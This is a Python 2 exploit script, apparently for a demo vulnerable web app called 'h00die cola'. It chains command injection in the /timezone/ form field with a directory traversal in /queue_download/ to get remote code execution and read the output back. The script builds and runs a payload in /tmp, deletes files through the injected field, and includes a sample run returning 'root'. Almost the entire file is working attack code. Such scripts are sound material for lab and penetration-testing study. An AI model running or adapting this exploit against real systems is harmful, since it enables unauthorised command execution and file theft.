#!/usr/bin/python2
# -*- coding: utf-8 -*-

# Exploit for h00die cola which hits an RCE in /timezone/ and a dir travers to get the blind output

'''
Example run:
# python rce.py --server http://127.0.0.1 --username test --password test "whoami"
[i]  Logging in as test:test
[i]  Deleting old data
[+]  Uploading command with 1 requests
[i]    Sending part 1 -> echo -n "whoami" >> /tmp/c
[+]  Chmoding payload
[+]  Running payload
[i]  Queueing output for download
[i]  Downloading queued item 39
[+]  ==============content=====================
root

[+]  ==========================================
'''

import argparse
import requests

# colored output
class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'
f = bcolors.FAIL + "[x] " + bcolors.ENDC
g = bcolors.OKGREEN + "[+] " + bcolors.ENDC
info = bcolors.WARNING + "[i] " + bcolors.ENDC

parser = argparse.ArgumentParser(description="Exploit for the ndepth demo h00die cola RCE.")
parser.add_argument('--server', metavar='s', help='Server address with protocol',
                    default="http://127.0.0.1")
parser.add_argument('--username', metavar='u', help='Username')
parser.add_argument('--password', metavar='p', help='Password')
parser.add_argument('command', help='Command to execute')
args = parser.parse_args()

# We have already determined our max command execution length is 46 characters
# so we need to split appropriately on that

stub = 'echo -n "%s" >> /tmp/c' #14 character wrapper
length = 46 - len(stub) - 8 # we subtract 8 for other padding
# break the command up into an array of appropriately sized strings so we can write it
command = [args.command[i:i+length] for i in range(0,len(args.command),length)]

with requests.Session() as s:
  csrf = ''
  r = s.get(args.server + '/login')
  csrf = s.cookies.get('csrftoken')
  print info, 'Logging in as %s:%s' %(args.username,args.password)
  r = s.post("%s/login/" %(args.server), cookies=s.cookies,
             data={'username':args.username, 'password':args.password,
                   'csrfmiddlewaretoken':csrf})
  if not r.status_code == 200:
     print f, "Error logging in: %s" %(r.status_code)
     quit()

  # get a fresh csrf value
  r = s.get('%s/timezone/' %(args.server), cookies=s.cookies)
  csrf = s.cookies.get('csrftoken')

  print info, "Deleting old data"
  r = s.post('%s/timezone/' %(args.server), cookies=s.cookies,
               data={'timezone':'rm /tmp/c;rm /tmp/o',
                     'csrfmiddlewaretoken':csrf})
  csrf = s.cookies.get('csrftoken')

  print g, "Uploading command with %s requests" %(len(command))
  for counter, c in enumerate(command, start=1):
    print info, "  Sending part %s -> %s" %(counter, stub %(c))
    r = s.post('%s/timezone/' %(args.server), cookies=s.cookies,
               data={'timezone':stub %(c),
                     'csrfmiddlewaretoken':csrf})
    csrf = s.cookies.get('csrftoken')

  print g, "Chmoding payload"
  r = s.post('%s/timezone/' %(args.server), cookies=s.cookies,
               data={'timezone':'chmod +x /tmp/c',
                     'csrfmiddlewaretoken':csrf})
  csrf = s.cookies.get('csrftoken')

  print g, "Running payload"
  r = s.post('%s/timezone/' %(args.server), cookies=s.cookies,
               data={'timezone':'/tmp/c > /tmp/o',
                     'csrfmiddlewaretoken':csrf})
  csrf = s.cookies.get('csrftoken')

  print info, "Queueing output for download"
  r = s.post('%s/queue_download/' %(args.server), cookies=s.cookies,
               data={'location':'../../../../../../../../../../tmp/o',
                     'csrfmiddlewaretoken':csrf})
  id = r.content.strip()
  csrf = s.cookies.get('csrftoken')
  print info, "Downloading queued item %s" %(id)
  r = s.post('%s/download/' %(args.server), cookies=s.cookies,
               data={'id':id, 'csrfmiddlewaretoken':csrf})
  print g, "==============content====================="
  print(r.content)
  print g, "=========================================="
